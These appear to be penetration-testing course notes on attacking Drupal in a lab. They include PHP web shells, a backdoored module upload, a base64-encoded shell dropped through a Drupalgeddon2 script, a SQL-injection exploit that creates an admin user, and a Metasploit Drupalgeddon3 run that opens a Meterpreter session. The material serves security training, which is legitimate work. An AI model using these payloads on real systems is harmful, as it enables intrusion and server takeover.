# Attacking Drupal 

## Overview
Unlike Joomla/WordPress, Drupal doesn't offer a simple "edit a theme PHP file" path to RCE from the admin console — exploitation requires more specific techniques.

---

## Method 1: Leveraging the PHP Filter Module

### Drupal < 8 (module built-in)
1. Log in as admin → enable **PHP filter module** ("Allows embedded PHP code/snippets to be evaluated")
2. Go to **Content → Add content → Basic page**
3. Insert a PHP web shell, using a **non-guessable parameter name** (MD5 hash, not `cmd`) to avoid drive-by discovery:
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
4. Set **Text format** dropdown to **PHP code**
5. Save → redirected to new node (e.g., `/node/3`)
6. Trigger execution via browser or cURL:
```
junior-security-analyst@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupal 8+ (module not installed by default)
- Must download & manually install the module — **get client permission first**, since you're modifying their instance
```
junior-security-analyst@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- Install via **Administration → Reports → Available updates** (or **Extend** menu, depending on version) → Browse → Install
- Then repeat the Basic Page + PHP code steps above

### Cleanup
- Always **remove/disable the PHP Filter module** and **delete the created page(s)** when finished
- Document everything for the report

## Method 2: Uploading a Backdoored Module

Requires permission to upload modules. Approach: take a legitimate module, insert a web shell.

1. Download & extract a real module (e.g., CAPTCHA):
```
junior-security-analyst@htb[/htb]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
junior-security-analyst@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
2. Create the web shell:
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
3. Create a `.htaccess` to bypass the default deny on `/modules` (Drupal blocks direct access to this folder by default):
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
4. Copy both files into the module folder, repackage:
```
junior-security-analyst@htb[/htb]$ mv shell.php .htaccess captcha
junior-security-analyst@htb[/htb]$ tar cvf captcha.tar.gz captcha/
```
5. In admin panel: **Manage → Extend → + Install new module** → upload the backdoored archive → Install
6. Trigger shell:
```
junior-security-analyst@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Known Vulnerabilities — The "Drupalgeddon" Family

Three major core RCE/SQLi vulns, collectively known as **Drupalgeddon**:

| Name | CVE | Affects | Type |
|---|---|---|---|
| **Drupalgeddon** | CVE-2014-3704 | 7.0 – 7.31 (fixed in 7.32) | Pre-auth **SQL injection** → upload malicious form / create admin user |
| **Drupalgeddon2** | CVE-2018-7600 | < 7.58 and < 8.5.1 | **RCE** via insufficient input sanitization during user registration |
| **Drupalgeddon3** | CVE-2018-7602 | Multiple 7.x/8.x versions | **Authenticated RCE** via improper Form API validation |

### Drupalgeddon (CVE-2014-3704)
Pre-auth SQLi used to create a new admin user, then log in and enable PHP Filter module for RCE.
```
junior-security-analyst@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
Result: `[!] VULNERABLE!` → new admin account created (`hacker:pwnd`) → log in and proceed as in Method 1.
- Also exploitable via Metasploit: `exploit/multi/http/drupal_drupageddon`

### Drupalgeddon2 (CVE-2018-7600)
PoC script (`drupalgeddon2.py`) confirms vuln by writing a test file:
```
junior-security-analyst@htb[/htb]$ python3 drupalgeddon2.py
Enter target url: http://drupal-dev.inlanefreight.local/
Check: http://drupal-dev.inlanefreight.local/hello.txt
```
Verify:
```
junior-security-analyst@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
;-)
```

**Escalate to RCE** — modify script to upload a malicious PHP file instead:
```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```
Base64-encode it for embedding in the script's write command:
```
junior-security-analyst@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```
Replace the script's echo command with the decode-and-write version:
```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
Re-run exploit → confirm RCE:
```
junior-security-analyst@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupalgeddon3 (CVE-2018-7602)
**Authenticated** RCE — requires a user with **node-delete permission**. Exploited via Metasploit.

1. Log in manually, grab the session cookie
2. Configure the module:
```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```
Result: Meterpreter session as `www-data`
```
meterpreter > getuid
Server username: www-data (33)

meterpreter > sysinfo
Computer : app01
OS       : Linux app01 5.4.0-81-generic ... x86_64
```

## Key Takeaways
- Drupal RCE paths: **PHP Filter module abuse**, **backdoored module upload**, or **Drupalgeddon CVEs**
- Always get **client permission** before installing/enabling modules
- **Drupalgeddon** (SQLi) → create admin → PHP Filter RCE
- **Drupalgeddon2** → unauthenticated RCE via file upload
- **Drupalgeddon3** → authenticated RCE via Metasploit, needs node-delete rights + valid session
- Clean up all shells/pages/modules created during testing and document hashes/paths for the report
- **Next in track:** Tomcat
